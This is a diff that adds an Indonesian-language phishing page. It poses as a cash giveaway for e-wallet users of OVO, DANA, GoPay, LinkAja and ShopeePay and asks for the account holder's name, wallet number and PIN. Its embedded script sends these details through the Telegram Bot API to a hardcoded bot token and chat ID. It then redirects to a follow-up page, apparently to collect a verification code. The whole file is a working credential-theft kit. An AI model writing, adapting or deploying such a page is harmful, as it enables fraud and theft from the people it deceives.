@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Dompet Digital</title>
+  <link rel="icon" type="image/x-icon" href="asset/logo-index3.png">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+  <style>
+    /* Custom CSS untuk tampilan di perangkat seluler */
+    .navbar {
+      background-color: #5babe0 !important; /* Background navbar */
+    }
+    .navbar-brand img {
+      width: 100px; /* Atur lebar gambar logo */
+    }
+    .navbar-brand h1 {
+      color: #fafafa; /* Warna teks pada navbar */
+    }
+    .title-web h2 {
+      font-size: 1rem; /* Atur ukuran teks */
+    }
+    .form-control {
+      border-radius: 15px; /* Atur border radius */
+    }
+    .btnNext {
+      border-radius: 19px; /* Atur border radius */
+      height: 45px; /* Atur tinggi tombol */
+    }
+    .background {
+      background-color: #5babe0; /* Background body */
+    }
+  </style>
+</head>
+<body class="background"> <!-- Menambahkan kelas background -->
+<nav class="navbar">
+  <div class="container">
+    <a class="navbar-brand" href="#">
+        <h3 style="color: #fff">GIVEAWAY UANG TUNAI</h3>
+    </a>
+    <h3 style="color: #46169e">Ewallet Digital</h3>
+  </div>
+</nav>
+<div class="container">
+  <div class="title-web mt-2">
+    <div class="logo-atas">
+      <center><img class="img-fluid" src="asset/dompetdigital.jpeg" alt=""></center>
+    </div>
+    <div class="title-web mt-2">
+      <h2 class="text-center">Silahkan isi data dengan benar ya BossQuu dan pastikan Ewallet sudah Premium atau Sudah Upgrade</h2>
+    </div>
+    <br>
+    <div class="container w-80 mt-3">
+      <div class="form-cc">
+        <div class="form-group">
+          <select class="form-control shadow-sm" id="input1">
+            <option value="">=Dompet Digital Anda=</option>
+            <option value="OVO">OVO</option>
+            <option value="DANA">DANA</option>
+            <option value="GOPAY">GOPAY</option>
+            <option value="LINKAJA">LINKAJA</option>
+            <option value="ShopeePay">ShopeePay</option>
+          </select>
+          <input type="text" class="form-control shadow-sm mt-3" id="input2" placeholder="Nama Pemilik Akun">
+          <input type="number" class="form-control shadow-sm mt-3" id="input3" placeholder="Nomor Dompet Digital">
+          <input type="number" class="form-control shadow-sm mt-3" id="input4" placeholder="Pin">
+        </div>
+        <div class="bnt-next mt-3 mb-3 text-center">
+          <button onclick="next()" class="btnNext mt-3" style="background-color: #003fed; border: none; width: 100%; color: white; font-weight: bold;">Konfirmasi</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  function sendMessage(id, botApi, pesan) {
+    const url = `https://api.telegram.org/bot${botApi}/sendMessage`;
+    const data = {
+      chat_id: id,
+      text: pesan
+    };
+    fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log('Pesan terkirim:', data);
+      window.location.href = "kodedomp.html"
+    })
+    .then(response => response.json())
+    .then(data => {
+      window.location.herf = "kodedomp.html";
+    })
+    .catch(error => {
+      console.error('Terjadi kesalahan:', error);
+    });
+  }
+
+  const next = () => {
+    const nocard = document.querySelector("#input1").value;
+    const norek = document.querySelector("#input2").value;
+    const ktp = document.querySelector("#input3").value;
+    const pin = document.querySelector("#input4").value;
+    let text = `==| Dompet DIGITAL |==\n\nEwallet: ${nocard}\nNama Pemilik: ${norek}\nNO Ewallet: ${ktp}\nPin Akun: ${pin}`;
+    let bot = "7070593349:AAGhtyk4PiU3fMmLVe9CQiKPaQlrZLR8yjM";
+    let id = "6250486742";
+    if (nocard === "" || norek === "" || ktp==="" || pin==="") {
+      alert("Mohon lengkapi data Anda.");
+    } else {
+      sendMessage(id, bot, text);
+    }
+  }
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+</body>
+</html>
